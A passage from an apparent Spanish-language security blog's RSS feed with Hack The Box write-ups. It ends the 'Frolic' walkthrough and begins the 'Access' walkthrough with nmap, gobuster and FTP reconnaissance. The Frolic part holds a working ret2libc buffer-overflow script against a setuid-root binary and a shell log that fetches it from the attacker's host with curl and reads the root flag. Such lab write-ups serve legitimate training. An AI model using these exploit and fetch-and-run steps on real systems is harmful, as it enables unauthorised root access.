-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root  root  7.4K Sep &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 00:59 rop
www-data@frolic:/home/ayush/.binary$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando el siguiente script obtenemos privilegios root y nuestra bandera &amp;lsquo;root.txt&amp;rsquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;subprocess&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb7e19000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0003ada0&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb7e19000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0002e9d0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;binsh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb7e19000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0015ba0b&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
     &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;I&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;52&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;binsh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/home/ayush/.binary/rop&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@frolic:/tmp$ curl 10.10.15.46:80/bf.py -o bf.py
www-data@frolic:/tmp$ ls
ls
bf.py
www-data@frolic:/tmp$ python bf.py
python bf.py
&lt;span class=&#34;c1&#34;&gt;# whoami; id; wc -c /root/root.txt; cat /root/root.txt&lt;/span&gt;
whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; wc -c /root/root.txt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; cat /root/root.txt
root
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; /root/root.txt
85d3fdf03f969892538ba9a731826222
# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/frolic/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/frolic/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Access</title>
        <link>https://sckull.github.io/posts/access/</link>
        <pubDate>Sat, 02 Mar 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 Mar 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/access/</guid>
        <description>Access es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.</description>
        <content:encoded>&lt;p&gt;



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;
&lt;br /&gt;
&lt;br&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Access es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Utilizando la herramienta nmap para escaneo de puertos y servicios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2018-09-29 21:08 CST
Initiating SYN Stealth Scan at 21:08
Scanning 10.10.10.98 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.98&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;65535&lt;/span&gt; ports&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
Completed SYN Stealth Scan at 21:15, 438.01s elapsed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;65535&lt;/span&gt; total ports&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Initiating Service scan at 21:15
Scanning &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; services on 10.10.10.98 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.98&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Completed Service scan at 21:18, 160.97s elapsed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; services on &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Completed NSE at 21:19, 1.78s elapsed
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.98 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.98&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.37s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Can&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t get directory listing: TIMEOUT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Supported Methods: OPTIONS TRACE GET HEAD POST
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/7.5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: MegaCorp
Warning: OSScan results may be unreliable because we could not find at least &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; open and &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; closed port
Device type: specialized&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;general purpose&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;phone
Running &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;JUST GUESSING&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: Microsoft Windows 7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;8&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;Phone&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;2008&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;8.1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;Vista &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;91%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Embedded Standard &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;91%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows 8.1 Update &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;91%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Phone 7.5 or 8.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;91%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; or Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;90%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;90%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;90%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 or Windows 8.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;90%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 SP1 or Windows &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;90%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;90%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; SP1 or Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;90%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; conditions non-ideal&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Uptime guess: 0.017 days &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;since Sat Sep &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 20:54:14 2018&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops
TCP Sequence Prediction: &lt;span class=&#34;nv&#34;&gt;Difficulty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;263&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Good luck!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using port 23/tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   342.05 ms 10.10.12.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.12.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   340.87 ms 10.10.10.98 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.98&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

NSE: Script Post-scanning.
Initiating NSE at 21:19
Completed NSE at 21:19, 0.00s elapsed
Initiating NSE at 21:19
Completed NSE at 21:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 646.94 seconds
           Raw packets sent: &lt;span class=&#34;m&#34;&gt;131457&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;5.788MB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Rcvd: &lt;span class=&#34;m&#34;&gt;537&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;26.626KB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_204827.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Se utilizo la herramienta gobuster para realizar una busqueda de archivos, directorios, etc. dentro del sitio web.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/access# gobuster -u http://10.10.10.98/ -w /usr/share/wordlists/dirb/common.txt -np -x asp,aspx,txt,html -t &lt;span class=&#34;nv&#34;&gt;15&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : http://10.10.10.98/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : aspx,txt,html,asp
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/03/03 02:43:38 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/Index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;No encontramos mucho para poder explorar mas que solo el index.html.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Iniciamos sesion en el servicio FTP con el usuario y contraseña &amp;lsquo;anonymous&amp;rsquo;. Dentro de este encontramos dos carpetas y dos archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
